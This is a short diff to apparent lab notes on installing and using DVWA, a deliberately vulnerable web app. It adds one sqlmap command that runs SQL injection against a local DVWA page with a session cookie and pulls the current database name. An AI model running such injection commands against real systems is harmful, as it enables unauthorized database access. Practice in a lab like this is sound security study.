@@ -1,6 +1,8 @@
 
 # 
 
+sqlmap -u "//192.168.79.132/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=austaukdtb8jq2919eideuqkp3; security=low" --current-db
+
 https://blog.csdn.net/qq_32400847/article/details/53697849
 
 # dvwa安裝和使用指南
